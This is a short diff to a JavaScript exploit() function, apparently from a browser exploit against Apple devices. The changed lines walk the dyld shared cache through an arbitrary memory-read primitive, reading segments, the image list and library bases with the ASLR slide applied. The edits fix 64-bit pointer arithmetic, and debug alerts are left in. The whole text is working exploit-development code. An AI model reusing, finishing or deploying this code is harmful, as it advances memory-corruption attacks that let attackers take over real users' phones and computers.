@@ -556,7 +556,7 @@ function exploit(){
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
         log(memory.u32(Add(hdr,0x14)))
         log(memory.u32(Add(hdr,0x10)))
-        var segdata  = memory.read(hdr + memory.u32(hdr + 0x10), nsegs * 0x20);
+        var segdata  = memory.read(Add(hdr,memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
         for(var i = 0; i < nsegs; ++i)
         {
@@ -651,7 +651,7 @@ function exploit(){
         var imgs  = Add(hdr,memory.u32(Add(hdr,0x18)));
        // alert(Add(hdr, r32(Add(hdr,0x18))))
         alert("dyld cache images@" + imgs);
-        var nimgs = memory.u32(hdr + 0x1c);
+        var nimgs = memory.u32(Add(hdr, 0x1c));
         alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
@@ -660,7 +660,7 @@ function exploit(){
             {
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.readInt64(imgs + i * 0x20), slide);
+            var base = Add(memory.readInt64(Add(imgs ,i * 0x20)), slide);
             alert(base)
             //alert("r32"+Add(r32(Add(imgs, i * 0x20),cache_slide)))
             if(opcode_libs.some(lib => strcmp(fn, lib)))
